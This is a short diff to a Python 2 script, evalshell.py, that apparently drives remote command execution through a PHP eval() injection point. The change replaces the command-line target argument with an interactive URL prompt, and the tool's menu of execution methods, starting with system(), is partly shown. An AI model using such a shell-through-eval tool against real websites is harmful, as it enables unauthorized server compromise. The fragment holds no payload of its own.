@@ -13,12 +13,14 @@ print """
 
 """
 
-if len(sys.argv) != 2:
-    print "Usage: ./evalshell.py <targeturl>"
-    print "Example: ./evalshell.py http://localhost/test.php?eval="
-    sys.exit(0)
+print "Usage: ./evalshell.py"
+print "URL: http://localhost/test.php?eval="
 
-url = sys.argv[1]
+sDirtyUrl = input("URL: ")
+sUrl = str(sDirtyUrl).strip()
+print "[+] sUrl: " + str(sUrl) + ""
+
+url = sUrl
 
 print "Select execution type to use\n"
 print "1. system() function"
